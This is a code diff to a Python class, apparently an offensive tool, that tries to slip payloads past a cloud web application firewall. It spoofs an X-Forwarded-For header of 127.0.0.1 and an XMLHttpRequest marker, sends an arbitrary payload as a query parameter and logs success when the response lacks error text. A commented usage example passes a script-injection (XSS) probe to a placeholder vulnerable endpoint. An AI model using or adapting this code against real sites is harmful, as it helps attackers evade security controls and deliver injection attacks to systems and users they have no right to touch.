@@ -1,20 +1,30 @@
 import requests
-import random
+import logging
+
+logger = logging.getLogger(__name__)
 
 class CloudWAFBypass:
     def __init__(self, target_url):
         self.target_url = target_url
 
-    def bypass_waf(self):
+    def bypass_waf(self, payload):
+        """
+        Menggunakan teknik-teknik untuk menghindari deteksi WAF berbasis cloud.
+        """
         headers = {
-            "User-Agent": random.choice(["Mozilla/5.0", "Chrome/88.0", "Safari/537.36"]),
-            "X-Forwarded-For": str(random.randint(1, 255)) + "." + str(random.randint(1, 255)) + "." + str(random.randint(1, 255)) + "." + str(random.randint(1, 255))
+            'User-Agent': 'Mozilla/5.0',
+            'X-Forwarded-For': '127.0.0.1',
+            'X-Requested-With': 'XMLHttpRequest'
         }
         try:
-            response = requests.get(self.target_url, headers=headers)
-            if response.status_code == 200:
-                print(f"Bypassed WAF with headers: {headers}")
+            response = requests.get(self.target_url, params={"payload": payload}, headers=headers)
+            if "error" not in response.text.lower():
+                logger.info(f"WAF bypassed successfully with payload: {payload}")
             else:
-                print(f"WAF still blocking with status code: {response.status_code}")
-        except requests.RequestException as e:
-            print(f"Error bypassing WAF: {e}")
+                logger.warning(f"WAF not bypassed with payload: {payload}")
+        except Exception as e:
+            logger.error(f"Error during WAF bypass: {str(e)}")
+
+# Contoh penggunaan:
+# waf_bypass = CloudWAFBypass("http://example.com/vulnerable-endpoint")
+# waf_bypass.bypass_waf("<script>alert('WAF Bypass')</script>")
